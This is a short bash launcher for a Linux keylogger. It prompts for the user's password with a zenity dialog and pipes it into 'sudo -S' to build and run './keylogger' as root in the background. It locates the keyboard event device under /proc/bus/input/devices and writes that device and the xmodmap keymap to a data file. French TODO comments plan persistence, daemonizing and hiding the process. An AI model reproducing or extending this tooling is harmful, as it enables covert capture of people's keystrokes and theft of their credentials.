#! /bin/bash

parse(){
    keyMap=$(echo "$@" |\
     sed 's|backslash|\\|g' |\
	 sed 's|slash|/|g' |\
	 sed "s|apostrophe|'|g" |\
	 sed "s|parenright|)|g" |\
	 sed "s|parenleft|(|g" |\
	#  sed 's|Return|\x0a|g' |\
	 sed 's|dollar|\$|g')
}

getKbdMap(){
	keyboards=$(cat /proc/bus/input/devices | grep -A 7 keyboard)
	eventfile=$(echo $keyboards | grep "H: " | sed -n 's/^.*\(event[^ ]*\).*/\1/p')
	#TODO clean sed command
	keyMap=$(xmodmap -pke | awk  '{printf substr($0, index($0, $3))"|\n"}' | cut -c3- )
	parse "${keyMap//[$'\t\r\n']}"
}
#Ask password
password=$(zenity --password --title=Authentication)"\n\n\n"

#echo $keyMap | awk '{print "\""$0"\""}' | echo $@ 
echo -e $password | sudo -S make re
if [ $? -ne 0 ]
then
echo -e "MAKE FAILED\n"
exit 0 
fi
getKbdMap
echo "/dev/input/$eventfile" > klg.data
echo "${keyMap}" >> klg.data
echo -e $password | sudo -S -b ./keylogger   &
echo $?

#TODO loop on $? for retry
#TODO completer le PARSEUR
#TODO ajouter un systeme de persistence du keylogger
#TODO deamonize process
#TODO PUT adefien thats hide or not process